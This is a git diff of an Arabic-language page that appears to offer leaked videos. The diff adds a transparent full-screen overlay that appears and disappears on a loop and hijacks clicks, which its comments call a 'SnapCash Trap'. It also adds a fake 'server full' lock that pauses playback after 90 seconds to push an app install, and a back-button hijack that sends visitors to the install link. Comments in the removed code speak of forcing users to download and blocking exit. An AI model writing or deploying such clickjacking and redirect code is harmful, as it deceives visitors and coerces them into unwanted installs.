@@ -20,54 +20,48 @@
 
         body { background-color: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; text-align: center; overflow-x: hidden; }
         
-        /* ستارة Adsterra الشفافة للتحفيز العكسي */
-        #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; display: none; }
+        /* الستارة الشفافة المسيطرة (SnapCash Trap) */
+        #invisible-overlay { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: transparent; 
+            z-index: 20000; 
+            cursor: pointer; 
+            display: none; 
+        }
         
-        /* قفل السيرفر المتطور */
         #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.97); z-index: 10001; display: none; align-items: center; justify-content: center; backdrop-filter: blur(20px); }
-        
         .lock-card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 85%; box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); }
         .main-container { max-width: 650px; margin: auto; padding: 10px; }
         header { padding: 15px; border-bottom: 1px solid #222; margin-bottom: 15px; }
         .logo { font-size: 1.8rem; font-weight: 900; color: var(--accent); text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
-        
         .video-card { background: #111; border-radius: 12px; overflow: hidden; border: 1px solid #333; margin-bottom: 25px; }
         .video-title { padding: 10px; font-size: 0.9rem; color: var(--secondary); text-align: right; border-bottom: 1px solid #222; background: #161616; }
         .hero-video { aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; background: #000; }
         video { width: 100%; height: 100%; object-fit: contain; }
-        
         .btn-install { background: linear-gradient(90deg, #00C853, #64DD17); color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 25px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
-        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.05); } 100% { transform: scale(1); } }
         .refuse-link { color: #444; font-size: 0.8rem; text-decoration: underline; margin-top: 20px; display: block; cursor: pointer; }
-
         .status-bar { font-size: 0.75rem; color: #666; padding: 10px; border-top: 1px solid #222; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div id="invisible-overlay" onclick="handleAdClick()"></div>
+<div id="invisible-overlay" onclick="triggerSnapCash()"></div>
 
 <div id="app-lock-overlay">
     <div class="lock-card">
         <div style="font-size: 3rem; margin-bottom: 10px;">🛡️</div>
-        <h2 style="color: var(--secondary); margin-bottom: 15px;">عذراً: السيرفر ممتلئ!</h2>
-        <p style="color: #eee; font-size: 1rem; line-height: 1.6;">
-            لتجنب حذف المحتوى وضمان مشاهدة سريعة بدون تقطيع، يرجى فتح الأرشيف عبر التطبيق الرسمي من المتاجر المعتمدة.
-        </p>
-        <div style="margin: 20px 0;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="135">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="135">
-        </div>
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1PRVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==" 
-           class="btn-install">تثبيت وفتح المشاهدة الآن</a>
-        <span class="refuse-link" onclick="handleRefusal()">المتابعة عبر المتصفح (غير مستقر)</span>
+        <h2 style="color: var(--secondary);">عذراً: السيرفر ممتلئ!</h2>
+        <p style="color: #eee; font-size: 1rem; line-height: 1.6;">يرجى المتابعة عبر التطبيق الرسمي لضمان استمرار المشاهدة بجودة عالية.</p>
+        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?..." class="btn-install">تثبيت وفتح الآن</a>
+        <span class="refuse-link" onclick="handleRefusal()">المتابعة (سيرفر بطيء)</span>
     </div>
 </div>
 
-<header>
-    <h1 class="logo">حصريات العرب</h1>
-    <div style="color: #888; font-size: 0.8rem;">أرشيف التسريبات المباشر</div>
-</header>
+<header><h1 class="logo">حصريات العرب</h1></header>
 
 <div class="main-container">
     <div class="video-card">
@@ -116,61 +110,41 @@
     </div>
 </div>
 
-<div class="status-bar">
-    &copy; 2026 حصريات العرب - جميع الحقوق محفوظة
-</div>
+<div class="status-bar">&copy; 2026 حصريات العرب</div>
 
 <script>
-    const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
+    const snapLink = "https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1ORVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==";
     const overlay = document.getElementById('invisible-overlay');
     const lock = document.getElementById('app-lock-overlay');
-    let refusalMode = false;
 
-    // تفعيل القفل بعد 90 ثانية (التوقيت الذهبي لـ "ميرمرا")
+    function startSnapTrap() {
+        function loop() {
+            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
+            setTimeout(() => {
+                overlay.style.display = 'block';
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    loop();
+                }, 10000); 
+            }, waitTime);
+        }
+        loop();
+    }
+
+    setTimeout(startSnapTrap, 3000);
+
     setTimeout(() => {
         lock.style.display = 'flex';
         document.querySelectorAll('video').forEach(v => v.pause());
     }, 90000);
 
-    // التعامل مع رفض التحميل (بدء نظام الإزعاج)
-    function handleRefusal() {
-        window.open(adsLink, '_blank');
-        lock.style.display = 'none';
-        refusalMode = true;
-        activateNuisanceAds();
-    }
+    function handleRefusal() { lock.style.display = 'none'; }
+    function triggerSnapCash() { window.open(snapLink, '_blank'); overlay.style.display = 'none'; }
 
-    // نظام الستارة الشفافة التي تظهر وتختفي لإجبار المستخدم على التحميل
-    function activateNuisanceAds() {
-        function showCycle() {
-            if(!refusalMode) return;
-            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000; // هدوء 3-6 ث
-            const activeTime = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000; // إزعاج 8-12 ث
-
-            setTimeout(() => {
-                overlay.style.display = 'block';
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    showCycle(); 
-                }, activeTime);
-            }, waitTime);
-        }
-        showCycle();
-    }
-
-    function handleAdClick() {
-        window.open(adsLink, '_blank');
-        overlay.style.display = 'none';
-    }
-
-    // منع الخروج وتحويل المستخدم للإعلان
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
-        window.onpopstate = function() {
-            window.location.replace(adsLink);
-        };
+        window.onpopstate = function() { window.location.replace(snapLink); };
     })();
 </script>
-
 </body>
 </html>
